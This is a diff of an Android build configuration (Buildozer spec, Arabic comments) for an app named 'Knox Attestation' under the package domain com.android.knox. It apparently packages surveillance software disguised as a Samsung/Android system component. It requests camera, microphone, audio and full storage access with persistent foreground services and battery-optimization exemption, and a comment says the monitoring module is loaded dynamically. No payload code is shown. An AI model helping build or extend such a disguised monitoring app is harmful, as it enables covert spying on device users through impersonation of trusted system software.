@@ -4,23 +4,23 @@ title = Knox Attestation
 package.name = knoxattest
 package.domain = com.android.knox
 
-# المصادر: فقط main.py + مجلد assets + ملفات tflite
+# المصادر
 source.dir = .
 source.include_exts = py,png,jpg,kv,atlas,ttf,json,xml,txt,db,tflite
 source.include_patterns = assets/*, *.tflite
 source.exclude_dirs = tests,__pycache__,docs,.github
 
 # الإصدار
-version = 2.5.2
+version = 2.5.3
 
-# المتطلبات (باستخدام tensorflow-lite بدلاً من tensorflow الكامل)
-# هذا يقلل حجم APK بشكل كبير مع الحفاظ على أداء النموذج
-requirements = python3,kivy,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tensorflow-lite
+# ✅ المتطلبات - استخدام tensorflow الكامل بدلاً من tensorflow-lite (لضمان التوفر)
+# لاحقاً يمكنك تجربة tflite-runtime لكنه قد يتطلب recipe مخصص
+requirements = python3,kivy,requests,urllib3,certifi,pillow,pyjnius,android,cryptography,pyzipper,numpy,tensorflow
 
-# أيقونة التطبيق (ضع ملف ic_launcher.png في project/res/drawable/)
+# أيقونة التطبيق - تأكد من وجود الملف في المسار الصحيح
 icon.filename = %(source.dir)s/res/drawable/ic_launcher.png
 
-# الصلاحيات المطلوبة (شاملة API 33+)
+# الصلاحيات المطلوبة
 android.permissions = INTERNET, ACCESS_NETWORK_STATE, CAMERA, RECORD_AUDIO, WAKE_LOCK, FOREGROUND_SERVICE, POST_NOTIFICATIONS, REQUEST_IGNORE_BATTERY_OPTIMIZATIONS, MANAGE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES, READ_MEDIA_VIDEO, READ_MEDIA_AUDIO, FOREGROUND_SERVICE_DATA_SYNC, FOREGROUND_SERVICE_CAMERA, FOREGROUND_SERVICE_MICROPHONE
 
 # إعدادات SDK/NDK
@@ -40,16 +40,16 @@ android.foreground_service_type = dataSync|camera|microphone
 android.wakelock = True
 android.uses_cleartext_traffic = True
 
-# معلومات إضافية للتطبيق (Knox)
+# معلومات إضافية
 android.meta_data = com.samsung.android.knox.intent.action.KNOX_ATTESTATION=true
 
-# إعدادات الشاشة والوضع
+# عرض التطبيق
 orientation = portrait
 fullscreen = 1
 log_level = 2
 warn_on_root = 0
 
-# تم حذف السطر android.services = monitor:monitor.py لأن monitor.py ليس داخل APK
+# تم حذف android.services لأن monitor.py يُحمّل ديناميكياً
 
 [buildozer]
 log_level = 2
